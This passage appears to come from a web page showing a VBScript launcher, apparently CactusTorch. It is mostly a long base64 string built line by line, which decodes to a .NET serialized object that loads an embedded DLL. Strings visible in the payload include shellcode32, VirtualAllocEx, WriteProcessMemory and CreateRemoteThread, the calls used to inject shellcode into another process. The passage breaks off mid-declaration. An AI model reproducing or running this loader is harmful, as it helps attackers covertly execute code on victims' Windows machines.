&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;</span><br><span class="line">s = s &amp; &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;</span><br><span class="line">s = s &amp; &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;</span><br><span class="line">s = s &amp; &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;</span><br><span class="line">s = s &amp; &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;</span><br><span class="line">s = s &amp; &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;</span><br><span class="line">s = s &amp; &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;</span><br><span class="line">s = s &amp; &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;</span><br><span class="line">s = s &amp; &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;</span><br><span class="line">s = s &amp; &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;</span><br><span class="line">s = s &amp; &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;</span><br><span class="line">s = s &amp; &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;</span><br><span class="line">s = s &amp; &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;</span><br><span class="line">s = s &amp; &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;</span><br><span class="line">s = s &amp; &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;</span><br><span class="line">s = s &amp; &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;</span><br><span class="line">s = s &amp; &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;</span><br><span class="line">s = s &amp; &quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;</span><br><span class="line">s = s &amp; &quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;</span><br><span class="line">s = s &amp; &quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;</span><br><span class="line">s = s &amp; &quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;</span><br><span class="line">s = s &amp; &quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;</span><br><span class="line">s = s &amp; &quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;</span><br><span class="line">s = s &amp; &quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;</span><br><span class="line">s = s &amp; &quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;</span><br><span class="line">s = s &amp; &quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;</span><br><span class="line">s = s &amp; &quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;</span><br><span class="line">s = s &amp; &quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;</span><br><span class="line">s = s &amp; &quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;</span><br><span class="line">s = s &amp; &quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;</span><br><span class="line">s = s &amp; &quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;</span><br><span class="line">s = s &amp; &quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;</span><br><span class="line">s = s &amp; &quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;</span><br><span class="line">s = s &amp; &quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;</span><br><span class="line">s = s &amp; &quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG&quot;</span><br><span class="line">s = s &amp; &quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;</span><br><span class="line">s = s &amp; &quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;</span><br><span class="line">s = s &amp; &quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;</span><br><span class="line">s = s &amp; &quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;</span><br><span class="line">s = s &amp; &quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;</span><br><span class="line">s = s &amp; &quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;</span><br><span class="line">s = s &amp; &quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;</span><br><span class="line">s = s &amp; &quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;</span><br><span class="line">s = s &amp; &quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;</span><br><span class="line">s = s &amp; &quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;</span><br><span class="line">s = s &amp; &quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;</span><br><span class="line">s = s &amp; &quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;</span><br><span class="line">s = s &amp; &quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;</span><br><span class="line">s = s &amp; &quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;</span><br><span class="line">s = s &amp; &quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;</span><br><span class="line">s = s &amp; &quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;</span><br><span class="line">s = s &amp; &quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;</span><br><span class="line">s = s &amp; &quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;</span><br><span class="line">s = s &amp; &quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;</span><br><span class="line">s = s &amp; &quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;</span><br><span class="line">s = s &amp; &quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;</span><br><span class="line">s = s &amp; &quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;</span><br><span class="line">s = s &amp; &quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;</span><br><span class="line">s = s &amp; &quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;</span><br><span class="line">s = s &amp; &quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;</span><br><span class="line">s = s &amp; &quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;</span><br><span class="line">s = s &amp; &quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;</span><br><span class="line">s = s &amp; &quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;</span><br><span class="line">s = s &amp; &quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;</span><br><span class="line">s = s &amp; &quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;</span><br><span class="line">s = s &amp; &quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;</span><br><span class="line">s = s &amp; &quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;</span><br><span class="line">s = s &amp; &quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;</span><br><span class="line">s = s &amp; &quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;</span><br><span class="line">s = s &amp; &quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;</span><br><span class="line">s = s &amp; &quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;</span><br><span class="line">s = s &amp; &quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;</span><br><span class="line">s = s &amp; &quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;</span><br><span class="line">s = s &amp; &quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;</span><br><span class="line">s = s &amp; &quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;</span><br><span class="line">s = s &amp; &quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;</span><br><span class="line">s = s &amp; &quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;</span><br><span class="line">s = s &amp; &quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;</span><br><span class="line">s = s &amp; &quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;</span><br><span class="line">s = s &amp; &quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;</span><br><span class="line">s = s &amp; &quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;</span><br><span class="line">s = s &amp; &quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;</span><br><span class="line">s = s &amp; &quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;</span><br><span class="line">s = s &amp; &quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;</span><br><span class="line">s = s &amp; &quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;</span><br><span class="line">s = s &amp; &quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;</span><br><span class="line">s = s &amp; &quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;</span><br><span class="line">s = s &amp; &quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;</span><br><span class="line">s = s &amp; &quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;</span><br><span class="line">s = s &amp; &quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;</span><br><span class="line">s = s &amp; &quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;</span><br><span class="line">s = s &amp; &quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;</span><br><span class="line">s = s &amp; &quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;</span><br><span class="line">s = s &amp; &quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;</span><br><span class="line">s = s &amp; &quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;</span><br><span class="line">s = s &amp; &quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;</span><br><span class="line">s = s &amp; &quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;</span><br><span class="line">s = s &amp; &quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;</span><br><span class="line">s = s &amp; &quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;</span><br><span class="line">s = s &amp; &quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;</span><br><span class="line">s = s &amp; &quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;</span><br><span class="line">s = s &amp; &quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;</span><br><span class="line">s = s &amp; &quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;</span><br><span class="line">s = s &amp; &quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;</span><br><span class="line">s = s &amp; &quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;</span><br><span class="line">s = s &amp; &quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;</span><br><span class="line">s = s &amp; &quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;</span><br><span class="line">s = s &amp; &quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;</span><br><span class="line">s = s &amp; &quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;</span><br><span class="line">s = s &amp; &quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;</span><br><span class="line">s = s &amp; &quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;</span><br><span class="line">s = s &amp; &quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;</span><br><span class="line">s = s &amp; &quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;</span><br><span class="line">s = s &amp; &quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;</span><br><span class="line">s = s &amp; &quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;</span><br><span class="line">s = s &amp; &quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;</span><br><span class="line">s = s &amp; &quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;</span><br><span class="line">s = s &amp; &quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;</span><br><span class="line">s = s &amp; &quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;</span><br><span class="line">s = s &amp; &quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;</span><br><span class="line">s = s &amp; &quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;</span><br><span class="line">s = s &amp; &quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;</span><br><span class="line">s = s &amp; &quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;</span><br><span class="line">s = s &amp; &quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;</span><br><span class="line">s = s &amp; &quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;</span><br><span class="line"></span><br><span class="line">s = s &amp; &quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;</span><br><span class="line"></span><br><span class="line">entry_class = &quot;cactusTorch&quot;</span><br><span class="line"></span><br><span class="line">Dim fmt, al, d, 